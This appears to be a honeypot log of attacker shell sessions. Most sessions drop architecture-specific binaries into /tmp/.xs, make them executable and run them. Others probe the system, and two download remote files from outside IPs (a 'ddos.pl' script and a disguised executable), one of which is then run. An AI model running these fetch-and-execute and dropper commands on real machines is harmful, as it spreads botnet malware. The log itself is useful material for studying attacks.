edb7bd3a33fa4f8b8e74e39de2b8f1a4	chmod 777 /tmp/.xs/daemon.i686.mod
edb7bd3a33fa4f8b8e74e39de2b8f1a4	/tmp/.xs/daemon.i686.mod
c389f94dc39d4c75a0ad7ca00ec0e284	mkdir /tmp/.xs/
c389f94dc39d4c75a0ad7ca00ec0e284	cat  > /tmp/.xs/daemon.mips.mod
c389f94dc39d4c75a0ad7ca00ec0e284	chmod 777 /tmp/.xs/daemon.mips.mod
c389f94dc39d4c75a0ad7ca00ec0e284	/tmp/.xs/daemon.mips.mod
006eb03911114a20b10c02751a5750cf	uname
006eb03911114a20b10c02751a5750cf	free -m
006eb03911114a20b10c02751a5750cf	ps x
a38179c273a74f1a919fdbe42c1b726a	mkdir /tmp/.xs/
a38179c273a74f1a919fdbe42c1b726a	cat  > /tmp/.xs/daemon.armv4l.mod
a38179c273a74f1a919fdbe42c1b726a	chmod 777 /tmp/.xs/daemon.armv4l.mod
a38179c273a74f1a919fdbe42c1b726a	/tmp/.xs/daemon.armv4l.mod
063a524e83e14952a0bdb9d60e242be8	mkdir /tmp/.xs/
063a524e83e14952a0bdb9d60e242be8	cat  > /tmp/.xs/daemon.i686.mod
063a524e83e14952a0bdb9d60e242be8	chmod 777 /tmp/.xs/daemon.i686.mod
063a524e83e14952a0bdb9d60e242be8	/tmp/.xs/daemon.i686.mod
20cf656808a940c49419b2b7495202d2	mkdir /tmp/.xs/
20cf656808a940c49419b2b7495202d2	cat  > /tmp/.xs/daemon.mips.mod
20cf656808a940c49419b2b7495202d2	chmod 777 /tmp/.xs/daemon.mips.mod
20cf656808a940c49419b2b7495202d2	/tmp/.xs/daemon.mips.mod
a3d53950bc03447591845c850835f639	mkdir /tmp/.xs/
a3d53950bc03447591845c850835f639	cat  > /tmp/.xs/daemon.armv4l.mod
a3d53950bc03447591845c850835f639	chmod 777 /tmp/.xs/daemon.armv4l.mod
a3d53950bc03447591845c850835f639	/tmp/.xs/daemon.armv4l.mod
5c4e92b278d6451b85234d7f8c257d89	mkdir /tmp/.xs/
5c4e92b278d6451b85234d7f8c257d89	cat  > /tmp/.xs/daemon.i686.mod
5c4e92b278d6451b85234d7f8c257d89	chmod 777 /tmp/.xs/daemon.i686.mod
5c4e92b278d6451b85234d7f8c257d89	/tmp/.xs/daemon.i686.mod
6529618f10d54224b90a5329197411dd	mkdir /tmp/.xs/
6529618f10d54224b90a5329197411dd	cat  > /tmp/.xs/daemon.mips.mod
6529618f10d54224b90a5329197411dd	chmod 777 /tmp/.xs/daemon.mips.mod
6529618f10d54224b90a5329197411dd	/tmp/.xs/daemon.mips.mod
302d90a25c844a2fbb39c34df6b370ac	mkdir /tmp/.xs/
302d90a25c844a2fbb39c34df6b370ac	cat  > /tmp/.xs/daemon.armv4l.mod
302d90a25c844a2fbb39c34df6b370ac	chmod 777 /tmp/.xs/daemon.armv4l.mod
302d90a25c844a2fbb39c34df6b370ac	/tmp/.xs/daemon.armv4l.mod
dd671760f031487bb05295be74350475	mkdir /tmp/.xs/
dd671760f031487bb05295be74350475	cat  > /tmp/.xs/daemon.i686.mod
dd671760f031487bb05295be74350475	chmod 777 /tmp/.xs/daemon.i686.mod
dd671760f031487bb05295be74350475	/tmp/.xs/daemon.i686.mod
eae187b76a5745c98fed485ba41a026c	mkdir /tmp/.xs/
eae187b76a5745c98fed485ba41a026c	cat  > /tmp/.xs/daemon.mips.mod
eae187b76a5745c98fed485ba41a026c	chmod 777 /tmp/.xs/daemon.mips.mod
eae187b76a5745c98fed485ba41a026c	/tmp/.xs/daemon.mips.mod
7a1ff0aa02c245a7b7f15cc89643ce7e	mkdir /tmp/.xs/
7a1ff0aa02c245a7b7f15cc89643ce7e	cat  > /tmp/.xs/daemon.armv4l.mod
7a1ff0aa02c245a7b7f15cc89643ce7e	chmod 777 /tmp/.xs/daemon.armv4l.mod
7a1ff0aa02c245a7b7f15cc89643ce7e	/tmp/.xs/daemon.armv4l.mod
8fc6a6dec60c4ecc8fdd4bd3691d47e3	mkdir /tmp/.xs/
8fc6a6dec60c4ecc8fdd4bd3691d47e3	cat  > /tmp/.xs/daemon.i686.mod
8fc6a6dec60c4ecc8fdd4bd3691d47e3	chmod 777 /tmp/.xs/daemon.i686.mod
8fc6a6dec60c4ecc8fdd4bd3691d47e3	/tmp/.xs/daemon.i686.mod
3934ba9bcbd740eebdc5cca1581ac8db	mkdir /tmp/.xs/
3934ba9bcbd740eebdc5cca1581ac8db	cat  > /tmp/.xs/daemon.mips.mod
3934ba9bcbd740eebdc5cca1581ac8db	chmod 777 /tmp/.xs/daemon.mips.mod
3934ba9bcbd740eebdc5cca1581ac8db	/tmp/.xs/daemon.mips.mod
9e86759beed946ee9bd6524a8c3fc0f4	mkdir /tmp/.xs/
9e86759beed946ee9bd6524a8c3fc0f4	cat  > /tmp/.xs/daemon.armv4l.mod
9e86759beed946ee9bd6524a8c3fc0f4	chmod 777 /tmp/.xs/daemon.armv4l.mod
9e86759beed946ee9bd6524a8c3fc0f4	/tmp/.xs/daemon.armv4l.mod
5a128f7efbde4f9cba646ff051a47d1c	mkdir /tmp/.xs/
5a128f7efbde4f9cba646ff051a47d1c	cat  > /tmp/.xs/daemon.i686.mod
5a128f7efbde4f9cba646ff051a47d1c	chmod 777 /tmp/.xs/daemon.i686.mod
5a128f7efbde4f9cba646ff051a47d1c	/tmp/.xs/daemon.i686.mod
fbbe28606bc649e6a548113a60814df8	mkdir /tmp/.xs/
fbbe28606bc649e6a548113a60814df8	cat  > /tmp/.xs/daemon.mips.mod
fbbe28606bc649e6a548113a60814df8	chmod 777 /tmp/.xs/daemon.mips.mod
fbbe28606bc649e6a548113a60814df8	/tmp/.xs/daemon.mips.mod
7704b1563eb04b8184118ef7b18d4f7c	mkdir /tmp/.xs/
7704b1563eb04b8184118ef7b18d4f7c	cat  > /tmp/.xs/daemon.armv4l.mod
7704b1563eb04b8184118ef7b18d4f7c	chmod 777 /tmp/.xs/daemon.armv4l.mod
7704b1563eb04b8184118ef7b18d4f7c	/tmp/.xs/daemon.armv4l.mod
bfe5e9e2545147618afcceb83335b7eb	mkdir /tmp/.xs/
bfe5e9e2545147618afcceb83335b7eb	cat  > /tmp/.xs/daemon.i686.mod
bfe5e9e2545147618afcceb83335b7eb	chmod 777 /tmp/.xs/daemon.i686.mod
bfe5e9e2545147618afcceb83335b7eb	/tmp/.xs/daemon.i686.mod
cda2659830524534a200c9d4870ad678	mkdir /tmp/.xs/
cda2659830524534a200c9d4870ad678	cat  > /tmp/.xs/daemon.mips.mod
cda2659830524534a200c9d4870ad678	chmod 777 /tmp/.xs/daemon.mips.mod
cda2659830524534a200c9d4870ad678	/tmp/.xs/daemon.mips.mod
366b11abc1384099824c774b2a028a19	mkdir /tmp/.xs/
366b11abc1384099824c774b2a028a19	cat  > /tmp/.xs/daemon.armv4l.mod
366b11abc1384099824c774b2a028a19	chmod 777 /tmp/.xs/daemon.armv4l.mod
366b11abc1384099824c774b2a028a19	/tmp/.xs/daemon.armv4l.mod
75ca89af827140ed8811fe790d386838	mkdir /tmp/.xs/
75ca89af827140ed8811fe790d386838	cat  > /tmp/.xs/daemon.armv4l.mod
75ca89af827140ed8811fe790d386838	chmod 777 /tmp/.xs/daemon.armv4l.mod
75ca89af827140ed8811fe790d386838	/tmp/.xs/daemon.armv4l.mod
36e0feece07f47eca18edd5dca67b008	mkdir /tmp/.xs/
36e0feece07f47eca18edd5dca67b008	cat  > /tmp/.xs/daemon.i686.mod
36e0feece07f47eca18edd5dca67b008	chmod 777 /tmp/.xs/daemon.i686.mod
36e0feece07f47eca18edd5dca67b008	/tmp/.xs/daemon.i686.mod
fbd84168000049dbae017d24922c1d80	mkdir /tmp/.xs/
fbd84168000049dbae017d24922c1d80	cat  > /tmp/.xs/daemon.mips.mod
fbd84168000049dbae017d24922c1d80	chmod 777 /tmp/.xs/daemon.mips.mod
fbd84168000049dbae017d24922c1d80	/tmp/.xs/daemon.mips.mod
429d48ce502f4507bb7a2962808a7b5e	mkdir /tmp/.xs/
429d48ce502f4507bb7a2962808a7b5e	cat  > /tmp/.xs/daemon.armv4l.mod
429d48ce502f4507bb7a2962808a7b5e	chmod 777 /tmp/.xs/daemon.armv4l.mod
429d48ce502f4507bb7a2962808a7b5e	/tmp/.xs/daemon.armv4l.mod
4ef4776f5de246a291d461a7bd130364	mkdir /tmp/.xs/
4ef4776f5de246a291d461a7bd130364	cat  > /tmp/.xs/daemon.i686.mod
4ef4776f5de246a291d461a7bd130364	chmod 777 /tmp/.xs/daemon.i686.mod
4ef4776f5de246a291d461a7bd130364	/tmp/.xs/daemon.i686.mod
868b6865a4d442c3b29369b82a3780e8	mkdir /tmp/.xs/
868b6865a4d442c3b29369b82a3780e8	cat  > /tmp/.xs/daemon.mips.mod
868b6865a4d442c3b29369b82a3780e8	chmod 777 /tmp/.xs/daemon.mips.mod
868b6865a4d442c3b29369b82a3780e8	/tmp/.xs/daemon.mips.mod
5f64b7c01bb744b78bc7e4b22c83391c	mkdir /tmp/.xs/
5f64b7c01bb744b78bc7e4b22c83391c	cat  > /tmp/.xs/daemon.armv4l.mod
5f64b7c01bb744b78bc7e4b22c83391c	chmod 777 /tmp/.xs/daemon.armv4l.mod
5f64b7c01bb744b78bc7e4b22c83391c	/tmp/.xs/daemon.armv4l.mod
a3e495b0cdf54027bc18c2a185f4fe20	mkdir /tmp/.xs/
a3e495b0cdf54027bc18c2a185f4fe20	cat  > /tmp/.xs/daemon.i686.mod
a3e495b0cdf54027bc18c2a185f4fe20	chmod 777 /tmp/.xs/daemon.i686.mod
a3e495b0cdf54027bc18c2a185f4fe20	/tmp/.xs/daemon.i686.mod
d9f03ea6b2a143a8b9532cff7c9a4418	mkdir /tmp/.xs/
d9f03ea6b2a143a8b9532cff7c9a4418	cat  > /tmp/.xs/daemon.mips.mod
d9f03ea6b2a143a8b9532cff7c9a4418	chmod 777 /tmp/.xs/daemon.mips.mod
d9f03ea6b2a143a8b9532cff7c9a4418	/tmp/.xs/daemon.mips.mod
e7da007e1a854cdf8ff6b29a62dafb83	mkdir /tmp/.xs/
e7da007e1a854cdf8ff6b29a62dafb83	cat  > /tmp/.xs/daemon.armv4l.mod
e7da007e1a854cdf8ff6b29a62dafb83	chmod 777 /tmp/.xs/daemon.armv4l.mod
e7da007e1a854cdf8ff6b29a62dafb83	/tmp/.xs/daemon.armv4l.mod
037d86fe48bf4518b98faa777fc2b514	mkdir /tmp/.xs/
037d86fe48bf4518b98faa777fc2b514	cat  > /tmp/.xs/daemon.i686.mod
037d86fe48bf4518b98faa777fc2b514	chmod 777 /tmp/.xs/daemon.i686.mod
037d86fe48bf4518b98faa777fc2b514	/tmp/.xs/daemon.i686.mod
7a27a11c213c4e6da23ca2510d79e62e	mkdir /tmp/.xs/
7a27a11c213c4e6da23ca2510d79e62e	cat  > /tmp/.xs/daemon.mips.mod
7a27a11c213c4e6da23ca2510d79e62e	chmod 777 /tmp/.xs/daemon.mips.mod
7a27a11c213c4e6da23ca2510d79e62e	/tmp/.xs/daemon.mips.mod
96379bf7d32e4066ba7c1a87574f4d74	mkdir /tmp/.xs/
96379bf7d32e4066ba7c1a87574f4d74	cat  > /tmp/.xs/daemon.armv4l.mod
96379bf7d32e4066ba7c1a87574f4d74	chmod 777 /tmp/.xs/daemon.armv4l.mod
96379bf7d32e4066ba7c1a87574f4d74	/tmp/.xs/daemon.armv4l.mod
162f56e47dd1429abede8264c84ba180	mkdir /tmp/.xs/
162f56e47dd1429abede8264c84ba180	cat  > /tmp/.xs/daemon.i686.mod
162f56e47dd1429abede8264c84ba180	chmod 777 /tmp/.xs/daemon.i686.mod
162f56e47dd1429abede8264c84ba180	/tmp/.xs/daemon.i686.mod
af63080e4f044301bfd24e161e327175	mkdir /tmp/.xs/
af63080e4f044301bfd24e161e327175	cat  > /tmp/.xs/daemon.mips.mod
af63080e4f044301bfd24e161e327175	chmod 777 /tmp/.xs/daemon.mips.mod
af63080e4f044301bfd24e161e327175	/tmp/.xs/daemon.mips.mod
8f09137df5684c54ba9548d15291f269	mkdir /tmp/.xs/
8f09137df5684c54ba9548d15291f269	cat  > /tmp/.xs/daemon.armv4l.mod
8f09137df5684c54ba9548d15291f269	chmod 777 /tmp/.xs/daemon.armv4l.mod
8f09137df5684c54ba9548d15291f269	/tmp/.xs/daemon.armv4l.mod
cc22a835995a4236b5081f833923eb03	uname
cc22a835995a4236b5081f833923eb03	free -m
cc22a835995a4236b5081f833923eb03	ps x
c0f088d8084249aba223d7c841b22ee8	w
c0f088d8084249aba223d7c841b22ee8	ps -aux
990fbcc250d44494b01caf0b02072c07	wget -c http://173.214.164.245/php1ad.rar
990fbcc250d44494b01caf0b02072c07	ls -l
990fbcc250d44494b01caf0b02072c07	./php1ad.rar
efdd7027113441cfad03860823c13916	cd /tmp
efdd7027113441cfad03860823c13916	wget http://208.67.1.46/ddos.pl
9f26ae51237e421195a7f322e758c7b2	echo -n test
9f26ae51237e421195a7f322e758c7b2	cat /proc/version
e67a6bab8ff04a308f8db5da56d164e4	mkdir /tmp/.xs/
e67a6bab8ff04a308f8db5da56d164e4	cat  > /tmp/.xs/daemon.armv4l.mod
e67a6bab8ff04a308f8db5da56d164e4	chmod 777 /tmp/.xs/daemon.armv4l.mod
e67a6bab8ff04a308f8db5da56d164e4	/tmp/.xs/daemon.armv4l.mod
d76fed52f01846be9dcd43be76b53bcd	mkdir /tmp/.xs/
d76fed52f01846be9dcd43be76b53bcd	cat  > /tmp/.xs/daemon.i686.mod
d76fed52f01846be9dcd43be76b53bcd	chmod 777 /tmp/.xs/daemon.i686.mod
d76fed52f01846be9dcd43be76b53bcd	/tmp/.xs/daemon.i686.mod
05a927c7e8e34d72a69304bc97d2bc34	mkdir /tmp/.xs/
05a927c7e8e34d72a69304bc97d2bc34	cat  > /tmp/.xs/daemon.mips.mod
05a927c7e8e34d72a69304bc97d2bc34	chmod 777 /tmp/.xs/daemon.mips.mod
05a927c7e8e34d72a69304bc97d2bc34	/tmp/.xs/daemon.mips.mod
ccbb79b84b7244ff9e9bdd42587071e0	mkdir /tmp/.xs/
ccbb79b84b7244ff9e9bdd42587071e0	cat  > /tmp/.xs/daemon.mipsel.mod
ccbb79b84b7244ff9e9bdd42587071e0	chmod 777 /tmp/.xs/daemon.mipsel.mod
ccbb79b84b7244ff9e9bdd42587071e0	/tmp/.xs/daemon.mipsel.mod
6b7a033ceb9c4dee9fe8824056f9177e	mkdir /tmp/.xs/
6b7a033ceb9c4dee9fe8824056f9177e	cat  > /tmp/.xs/test.mod
6b7a033ceb9c4dee9fe8824056f9177e	chmod 777 /tmp/.xs/test.mod
6b7a033ceb9c4dee9fe8824056f9177e	/tmp/.xs/test.mod
20dc8684bd0646558c1b0f3e1f89e75b	mkdir /tmp/.xs/
20dc8684bd0646558c1b0f3e1f89e75b	cat  > /tmp/.xs/daemon.armv4l.mod
20dc8684bd0646558c1b0f3e1f89e75b	chmod 777 /tmp/.xs/daemon.armv4l.mod
20dc8684bd0646558c1b0f3e1f89e75b	/tmp/.xs/daemon.armv4l.mod
fe0a4814cfac4ef49760f9ff23bc8b74	mkdir /tmp/.xs/
fe0a4814cfac4ef49760f9ff23bc8b74	cat  > /tmp/.xs/daemon.i686.mod
fe0a4814cfac4ef49760f9ff23bc8b74	chmod 777 /tmp/.xs/daemon.i686.mod
fe0a4814cfac4ef49760f9ff23bc8b74	/tmp/.xs/daemon.i686.mod
13fdfe172b634c3c8805ce517bf1100e	mkdir /tmp/.xs/
13fdfe172b634c3c8805ce517bf1100e	cat  > /tmp/.xs/daemon.mips.mod
13fdfe172b634c3c8805ce517bf1100e	chmod 777 /tmp/.xs/daemon.mips.mod
13fdfe172b634c3c8805ce517bf1100e	/tmp/.xs/daemon.mips.mod
0871abdc185a41328d1c3442ff60413f	mkdir /tmp/.xs/
0871abdc185a41328d1c3442ff60413f	cat  > /tmp/.xs/daemon.mipsel.mod
0871abdc185a41328d1c3442ff60413f	chmod 777 /tmp/.xs/daemon.mipsel.mod
0871abdc185a41328d1c3442ff60413f	/tmp/.xs/daemon.mipsel.mod
48fd383422c240c6a872e8f30052bd1c	mkdir /tmp/.xs/
48fd383422c240c6a872e8f30052bd1c	cat  > /tmp/.xs/test.mod
48fd383422c240c6a872e8f30052bd1c	chmod 777 /tmp/.xs/test.mod
48fd383422c240c6a872e8f30052bd1c	/tmp/.xs/test.mod
a4bc98c7a8284622a96b5c92745f636b	mkdir /tmp/.xs/
a4bc98c7a8284622a96b5c92745f636b	cat  > /tmp/.xs/daemon.i686.mod
a4bc98c7a8284622a96b5c92745f636b	chmod 777 /tmp/.xs/daemon.i686.mod
a4bc98c7a8284622a96b5c92745f636b	/tmp/.xs/daemon.i686.mod
ceb58ebd1f25459fac7cf71e85129fac	mkdir /tmp/.xs/
ceb58ebd1f25459fac7cf71e85129fac	cat  > /tmp/.xs/daemon.mips.mod
ceb58ebd1f25459fac7cf71e85129fac	chmod 777 /tmp/.xs/daemon.mips.mod
ceb58ebd1f25459fac7cf71e85129fac	/tmp/.xs/daemon.mips.mod
f3322fea0f3c4c358ce2be98ac013b98	mkdir /tmp/.xs/
f3322fea0f3c4c358ce2be98ac013b98	cat  > /tmp/.xs/daemon.mipsel.mod
f3322fea0f3c4c358ce2be98ac013b98	chmod 777 /tmp/.xs/daemon.mipsel.mod
f3322fea0f3c4c358ce2be98ac013b98	/tmp/.xs/daemon.mipsel.mod
457c0227f37c41d4babe6881115b172d	mkdir /tmp/.xs/
457c0227f37c41d4babe6881115b172d	cat  > /tmp/.xs/test.mod
457c0227f37c41d4babe6881115b172d	chmod 777 /tmp/.xs/test.mod
457c0227f37c41d4babe6881115b172d	/tmp/.xs/test.mod
5d865ccaa95945bb933a613aab5235c2	mkdir /tmp/.xs/
5d865ccaa95945bb933a613aab5235c2	cat  > /tmp/.xs/daemon.armv4l.mod
5d865ccaa95945bb933a613aab5235c2	chmod 777 /tmp/.xs/daemon.armv4l.mod
5d865ccaa95945bb933a613aab5235c2	/tmp/.xs/daemon.armv4l.mod
ddfa8750ce3b43de9bc7cf7bb0b823aa	mkdir /tmp/.xs/
ddfa8750ce3b43de9bc7cf7bb0b823aa	cat  > /tmp/.xs/daemon.i686.mod
ddfa8750ce3b43de9bc7cf7bb0b823aa	chmod 777 /tmp/.xs/daemon.i686.mod
ddfa8750ce3b43de9bc7cf7bb0b823aa	/tmp/.xs/daemon.i686.mod
b32dd989f63d48a2b7ddd7d19e75955c	mkdir /tmp/.xs/
b32dd989f63d48a2b7ddd7d19e75955c	cat  > /tmp/.xs/daemon.mips.mod
b32dd989f63d48a2b7ddd7d19e75955c	chmod 777 /tmp/.xs/daemon.mips.mod
b32dd989f63d48a2b7ddd7d19e75955c	/tmp/.xs/daemon.mips.mod
f40d4dff643849099b205f6f8b1d0e2a	mkdir /tmp/.xs/
f40d4dff643849099b205f6f8b1d0e2a	cat  > /tmp/.xs/daemon.mipsel.mod
f40d4dff643849099b205f6f8b1d0e2a	chmod 777 /tmp/.xs/daemon.mipsel.mod
f40d4dff643849099b205f6f8b1d0e2a	/tmp/.xs/daemon.mipsel.mod
76601b8508864d2dae337829a5d1c748	mkdir /tmp/.xs/
76601b8508864d2dae337829a5d1c748	cat  > /tmp/.xs/test.mod
76601b8508864d2dae337829a5d1c748	chmod 777 /tmp/.xs/test.mod
76601b8508864d2dae337829a5d1c748	/tmp/.xs/test.mod
430bacff4c7d4ead959842c07fe162ce	mkdir /tmp/.xs/
430bacff4c7d4ead959842c07fe162ce	cat  > /tmp/.xs/daemon.armv4l.mod
430bacff4c7d4ead959842c07fe162ce	chmod 777 /tmp/.xs/daemon.armv4l.mod
430bacff4c7d4ead959842c07fe162ce	/tmp/.xs/daemon.armv4l.mod
885f430be83f45019b6ad9abf69faf6b	mkdir /tmp/.xs/
885f430be83f45019b6ad9abf69faf6b	cat  > /tmp/.xs/daemon.i686.mod
885f430be83f45019b6ad9abf69faf6b	chmod 777 /tmp/.xs/daemon.i686.mod
885f430be83f45019b6ad9abf69faf6b	/tmp/.xs/daemon.i686.mod
c33fb23677ec4dd0bbfb04cebac84b6e	mkdir /tmp/.xs/
c33fb23677ec4dd0bbfb04cebac84b6e	cat  > /tmp/.xs/daemon.mips.mod
c33fb23677ec4dd0bbfb04cebac84b6e	chmod 777 /tmp/.xs/daemon.mips.mod
c33fb23677ec4dd0bbfb04cebac84b6e	/tmp/.xs/daemon.mips.mod
adaea3cb7b20465c9fef7a20c12c86b7	mkdir /tmp/.xs/
adaea3cb7b20465c9fef7a20c12c86b7	cat  > /tmp/.xs/daemon.mipsel.mod
adaea3cb7b20465c9fef7a20c12c86b7	chmod 777 /tmp/.xs/daemon.mipsel.mod
adaea3cb7b20465c9fef7a20c12c86b7	/tmp/.xs/daemon.mipsel.mod
5b547a4315e244ada4aa4331f76de6da	mkdir /tmp/.xs/
5b547a4315e244ada4aa4331f76de6da	cat  > /tmp/.xs/test.mod
5b547a4315e244ada4aa4331f76de6da	chmod 777 /tmp/.xs/test.mod
5b547a4315e244ada4aa4331f76de6da	/tmp/.xs/test.mod
cf3b7354ebe84f2497e42c416943d424	mkdir /tmp/.xs/
cf3b7354ebe84f2497e42c416943d424	cat  > /tmp/.xs/daemon.armv4l.mod
cf3b7354ebe84f2497e42c416943d424	chmod 777 /tmp/.xs/daemon.armv4l.mod
cf3b7354ebe84f2497e42c416943d424	/tmp/.xs/daemon.armv4l.mod
a1911dd9e9314811be55f21873d4313f	mkdir /tmp/.xs/
a1911dd9e9314811be55f21873d4313f	cat  > /tmp/.xs/daemon.i686.mod
a1911dd9e9314811be55f21873d4313f	chmod 777 /tmp/.xs/daemon.i686.mod
a1911dd9e9314811be55f21873d4313f	/tmp/.xs/daemon.i686.mod
ee1cb80a8c01470fbb338306b0d1f26c	mkdir /tmp/.xs/
ee1cb80a8c01470fbb338306b0d1f26c	cat  > /tmp/.xs/daemon.mips.mod
ee1cb80a8c01470fbb338306b0d1f26c	chmod 777 /tmp/.xs/daemon.mips.mod
ee1cb80a8c01470fbb338306b0d1f26c	/tmp/.xs/daemon.mips.mod
86f72663ba7a4a49b47a77b1a23622f9	mkdir /tmp/.xs/
86f72663ba7a4a49b47a77b1a23622f9	cat  > /tmp/.xs/daemon.mipsel.mod
86f72663ba7a4a49b47a77b1a23622f9	chmod 777 /tmp/.xs/daemon.mipsel.mod
86f72663ba7a4a49b47a77b1a23622f9	/tmp/.xs/daemon.mipsel.mod
c1bd357b1e3c418a839a250f6a4ae040	mkdir /tmp/.xs/
c1bd357b1e3c418a839a250f6a4ae040	cat  > /tmp/.xs/test.mod
c1bd357b1e3c418a839a250f6a4ae040	chmod 777 /tmp/.xs/test.mod
c1bd357b1e3c418a839a250f6a4ae040	/tmp/.xs/test.mod
5c973de124be43aebc888181ac60a33c	mkdir /tmp/.xs/
5c973de124be43aebc888181ac60a33c	cat  > /tmp/.xs/daemon.armv4l.mod
5c973de124be43aebc888181ac60a33c	chmod 777 /tmp/.xs/daemon.armv4l.mod
5c973de124be43aebc888181ac60a33c	/tmp/.xs/daemon.armv4l.mod
8dc1864ec3b34d60aa8ed6ecffc1d5f4	mkdir /tmp/.xs/
8dc1864ec3b34d60aa8ed6ecffc1d5f4	cat  > /tmp/.xs/daemon.i686.mod
8dc1864ec3b34d60aa8ed6ecffc1d5f4	chmod 777 /tmp/.xs/daemon.i686.mod
8dc1864ec3b34d60aa8ed6ecffc1d5f4	/tmp/.xs/daemon.i686.mod
62748b7060154bf2ae1b42eac9cab98e	mkdir /tmp/.xs/
62748b7060154bf2ae1b42eac9cab98e	cat  > /tmp/.xs/daemon.mips.mod
62748b7060154bf2ae1b42eac9cab98e	chmod 777 /tmp/.xs/daemon.mips.mod
62748b7060154bf2ae1b42eac9cab98e	/tmp/.xs/daemon.mips.mod
663f6c6979784386a5fd16f4da9239fc	mkdir /tmp/.xs/
663f6c6979784386a5fd16f4da9239fc	cat  > /tmp/.xs/daemon.mipsel.mod
663f6c6979784386a5fd16f4da9239fc	chmod 777 /tmp/.xs/daemon.mipsel.mod
663f6c6979784386a5fd16f4da9239fc	/tmp/.xs/daemon.mipsel.mod
0c779111f738428d88dbd3eb91c3fd2e	mkdir /tmp/.xs/
0c779111f738428d88dbd3eb91c3fd2e	cat  > /tmp/.xs/test.mod
0c779111f738428d88dbd3eb91c3fd2e	chmod 777 /tmp/.xs/test.mod
0c779111f738428d88dbd3eb91c3fd2e	/tmp/.xs/test.mod
1c40b3ee4f304fb7a9096784efaaf06b	mkdir /tmp/.xs/
1c40b3ee4f304fb7a9096784efaaf06b	cat  > /tmp/.xs/daemon.armv4l.mod
1c40b3ee4f304fb7a9096784efaaf06b	chmod 777 /tmp/.xs/daemon.armv4l.mod
1c40b3ee4f304fb7a9096784efaaf06b	/tmp/.xs/daemon.armv4l.mod
bf7850d703c142ff8b1f9287699bcf8f	mkdir /tmp/.xs/
bf7850d703c142ff8b1f9287699bcf8f	cat  > /tmp/.xs/daemon.i686.mod
bf7850d703c142ff8b1f9287699bcf8f	chmod 777 /tmp/.xs/daemon.i686.mod
bf7850d703c142ff8b1f9287699bcf8f	/tmp/.xs/daemon.i686.mod
20a5ea64ce35442cb5ce3bc2c99de141	mkdir /tmp/.xs/
20a5ea64ce35442cb5ce3bc2c99de141	cat  > /tmp/.xs/daemon.mips.mod
20a5ea64ce35442cb5ce3bc2c99de141	chmod 777 /tmp/.xs/daemon.mips.mod
20a5ea64ce35442cb5ce3bc2c99de141	/tmp/.xs/daemon.mips.mod
a3d9a73601794ce9a8da92aeaef1892f	mkdir /tmp/.xs/
a3d9a73601794ce9a8da92aeaef1892f	cat  > /tmp/.xs/daemon.mipsel.mod
a3d9a73601794ce9a8da92aeaef1892f	chmod 777 /tmp/.xs/daemon.mipsel.mod
a3d9a73601794ce9a8da92aeaef1892f	/tmp/.xs/daemon.mipsel.mod
8a6daef5d6934cc28f3915cbfdda06b4	mkdir /tmp/.xs/
8a6daef5d6934cc28f3915cbfdda06b4	cat  > /tmp/.xs/test.mod
8a6daef5d6934cc28f3915cbfdda06b4	chmod 777 /tmp/.xs/test.mod
8a6daef5d6934cc28f3915cbfdda06b4	/tmp/.xs/test.mod
deb9b83dfdd14ce9830cce3283575f0c	mkdir /tmp/.xs/
deb9b83dfdd14ce9830cce3283575f0c	cat  > /tmp/.xs/daemon.armv4l.mod
deb9b83dfdd14ce9830cce3283575f0c	chmod 777 /tmp/.xs/daemon.armv4l.mod
deb9b83dfdd14ce9830cce3283575f0c	/tmp/.xs/daemon.armv4l.mod
7fd55e1f4e7b4a1e9eb93883d1ec2501	mkdir /tmp/.xs/
7fd55e1f4e7b4a1e9eb93883d1ec2501	cat  > /tmp/.xs/daemon.i686.mod
7fd55e1f4e7b4a1e9eb93883d1ec2501	chmod 777 /tmp/.xs/daemon.i686.mod
7fd55e1f4e7b4a1e9eb93883d1ec2501	/tmp/.xs/daemon.i686.mod
a53244436b764b5996ddf9527dbb9200	mkdir /tmp/.xs/
a53244436b764b5996ddf9527dbb9200	cat  > /tmp/.xs/daemon.mips.mod
a53244436b764b5996ddf9527dbb9200	chmod 777 /tmp/.xs/daemon.mips.mod
a53244436b764b5996ddf9527dbb9200	/tmp/.xs/daemon.mips.mod
96b8abcf00d045c38bdb2c74247fef3b	mkdir /tmp/.xs/
96b8abcf00d045c38bdb2c74247fef3b	cat  > /tmp/.xs/daemon.mipsel.mod
96b8abcf00d045c38bdb2c74247fef3b	chmod 777 /tmp/.xs/daemon.mipsel.mod
96b8abcf00d045c38bdb2c74247fef3b	/tmp/.xs/daemon.mipsel.mod
1987cf66914a45059b6f26056a5e82df	mkdir /tmp/.xs/
